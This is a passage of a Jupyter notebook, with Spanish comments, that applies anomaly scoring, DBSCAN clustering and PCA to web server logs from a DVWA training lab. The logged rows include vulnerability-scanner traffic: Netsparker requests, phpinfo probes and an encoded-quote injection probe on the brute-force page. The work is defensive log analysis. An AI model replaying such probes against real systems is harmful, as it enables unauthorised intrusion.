       "5377   15  22      12.0        0       1               0            1714   \n",
       "\n",
       "      anomaly_score  anomaly  Cluster  \n",
       "2         -0.208611        1        2  \n",
       "3         -0.208611        1        2  \n",
       "4         -0.208611        1        2  \n",
       "5         -0.208611        1        2  \n",
       "6         -0.208611        1        2  \n",
       "...             ...      ...      ...  \n",
       "5372      -0.344653        1        0  \n",
       "5373      -0.361155        1        0  \n",
       "5374      -0.361155        1        0  \n",
       "5376      -0.370226        1        0  \n",
       "5377      -0.361155        1        0  \n",
       "\n",
       "[2826 rows x 26 columns]"
      ]
     },
     "execution_count": 234,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[(df['Client IP'] == '192.168.4.164') & (df['anomaly'] == 1)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>...</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "      <th>Recibos</th>\n",
       "      <th>Envios</th>\n",
       "      <th>Bytes Recibidos</th>\n",
       "      <th>Bytes Enviados</th>\n",
       "      <th>anomaly_score</th>\n",
       "      <th>anomaly</th>\n",
       "      <th>Cluster</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:05 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2020</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>2020</td>\n",
       "      <td>0</td>\n",
       "      <td>0.059779</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>263</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>263</td>\n",
       "      <td>0</td>\n",
       "      <td>0.051211</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>20</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/phpinfo.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>286</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>286</td>\n",
       "      <td>0</td>\n",
       "      <td>0.051211</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>27</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:07 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/login.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1016</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1016</td>\n",
       "      <td>0</td>\n",
       "      <td>0.054938</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>107</th>\n",
       "      <td>205</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:07 +0300</td>\n",
       "      <td>NETSPARKER</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1964</td>\n",
       "      <td>0</td>\n",
       "      <td>0.059408</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5321</th>\n",
       "      <td>7019</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:34:02 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/view_source.php?id=exec&amp;...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>972</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>11.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>972</td>\n",
       "      <td>0</td>\n",
       "      <td>0.011230</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5357</th>\n",
       "      <td>7058</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/view_source.php?id=exec&amp;...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>972</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>972</td>\n",
       "      <td>0</td>\n",
       "      <td>0.053964</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5361</th>\n",
       "      <td>7067</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:04 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/?username=%2527&amp;pa...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1788</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1788</td>\n",
       "      <td>0</td>\n",
       "      <td>0.057850</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5371</th>\n",
       "      <td>7079</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:36:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/view_source.php?id=exec&amp;...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>972</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>12.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>972</td>\n",
       "      <td>0</td>\n",
       "      <td>0.008961</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5375</th>\n",
       "      <td>7084</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:36:39 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/?username=%2527&amp;pa...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1788</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>12.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1788</td>\n",
       "      <td>0</td>\n",
       "      <td>0.013096</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>2552 rows × 26 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      index      Client IP Ident Auth                   Timestamp      Method  \\\n",
       "0         0  192.168.4.164     -    -  22/Dec/2023:15:19:05 +0300         GET   \n",
       "1         1  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300        HEAD   \n",
       "12       20  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300        HEAD   \n",
       "16       27  192.168.4.164     -    -  22/Dec/2023:15:19:07 +0300         GET   \n",
       "107     205  192.168.4.164     -    -  22/Dec/2023:15:19:07 +0300  NETSPARKER   \n",
       "...     ...            ...   ...  ...                         ...         ...   \n",
       "5321   7019  192.168.4.164     -    -  22/Dec/2023:15:34:02 +0300         GET   \n",
       "5357   7058  192.168.4.164     -    -  22/Dec/2023:15:35:03 +0300         GET   \n",
       "5361   7067  192.168.4.164     -    -  22/Dec/2023:15:35:04 +0300         GET   \n",
       "5371   7079  192.168.4.164     -    -  22/Dec/2023:15:36:03 +0300         GET   \n",
       "5375   7084  192.168.4.164     -    -  22/Dec/2023:15:36:39 +0300         GET   \n",
       "\n",
       "                                                Request HTTP Version  \\\n",
       "0                                                /DVWA/     HTTP/1.1   \n",
       "1                                                /DVWA/     HTTP/1.1   \n",
       "12                                    /DVWA/phpinfo.php     HTTP/1.1   \n",
       "16                                      /DVWA/login.php     HTTP/1.1   \n",
       "107                                              /DVWA/     HTTP/1.1   \n",
       "...                                                 ...          ...   \n",
       "5321  /DVWA/vulnerabilities/view_source.php?id=exec&...     HTTP/1.1   \n",
       "5357  /DVWA/vulnerabilities/view_source.php?id=exec&...     HTTP/1.1   \n",
       "5361  /DVWA/vulnerabilities/brute/?username=%2527&pa...     HTTP/1.1   \n",
       "5371  /DVWA/vulnerabilities/view_source.php?id=exec&...     HTTP/1.1   \n",
       "5375  /DVWA/vulnerabilities/brute/?username=%2527&pa...     HTTP/1.1   \n",
       "\n",
       "      Status Code  Bytes Sent  ... Hora Dia  Latencia  Recibos  Envios  \\\n",
       "0             200        2020  ...   15  22       0.0        1       0   \n",
       "1             200         263  ...   15  22       0.0        1       0   \n",
       "12            200         286  ...   15  22       0.0        1       0   \n",
       "16            200        1016  ...   15  22       0.0        1       0   \n",
       "107           200        1964  ...   15  22       0.0        1       0   \n",
       "...           ...         ...  ...  ...  ..       ...      ...     ...   \n",
       "5321          200         972  ...   15  22      11.0        1       0   \n",
       "5357          200         972  ...   15  22       0.0        1       0   \n",
       "5361          200        1788  ...   15  22       0.0        1       0   \n",
       "5371          200         972  ...   15  22      12.0        1       0   \n",
       "5375          200        1788  ...   15  22      12.0        1       0   \n",
       "\n",
       "     Bytes Recibidos  Bytes Enviados  anomaly_score  anomaly  Cluster  \n",
       "0               2020               0       0.059779        0        0  \n",
       "1                263               0       0.051211        0        0  \n",
       "12               286               0       0.051211        0        0  \n",
       "16              1016               0       0.054938        0        0  \n",
       "107             1964               0       0.059408        0        0  \n",
       "...              ...             ...            ...      ...      ...  \n",
       "5321             972               0       0.011230        0        0  \n",
       "5357             972               0       0.053964        0        0  \n",
       "5361            1788               0       0.057850        0        0  \n",
       "5371             972               0       0.008961        0        0  \n",
       "5375            1788               0       0.013096        0        0  \n",
       "\n",
       "[2552 rows x 26 columns]"
      ]
     },
     "execution_count": 235,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[(df['Client IP'] == '192.168.4.164') & (df['anomaly'] == 0)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Clustering"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "features = ['Client IP_encoded', 'Method_encoded', 'Status Code', 'Bytes Recibidos', 'Bytes Enviados', 'Latencia']\n",
    "\n",
    "X = df[features]\n",
    "\n",
    "# Normalización de los datos\n",
    "scaler = MinMaxScaler()\n",
    "X_scaled = scaler.fit_transform(X)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\maria\\AppData\\Local\\Temp\\ipykernel_16564\\1781212450.py:3: SettingWithCopyWarning:\n",
      "\n",
      "\n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "\n"
     ]
    }
   ],
   "source": [
    "dbscan = DBSCAN(eps=0.5, min_samples=5)\n",
    "dbscan_labels = dbscan.fit_predict(X_scaled)\n",
    "X['Cluster'] = dbscan_labels"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{-1, 0, 1, 2}"
      ]
     },
     "execution_count": 141,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "set(dbscan_labels)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PCA"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [],
   "source": [
    "pca = PCA(n_components=0.99)\n",
    "principal_components = pca.fit_transform(X)\n",
    "components_df = pd.DataFrame(data=principal_components)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(10, 6))\n",
    "sns.scatterplot(x=components_df[0], y=components_df[1], hue=dbscan_labels, palette='viridis')\n",
    "plt.title('Clustering de Registros de Firewall usando DBSCAN')\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "RETO07_NARANJA",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.18"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
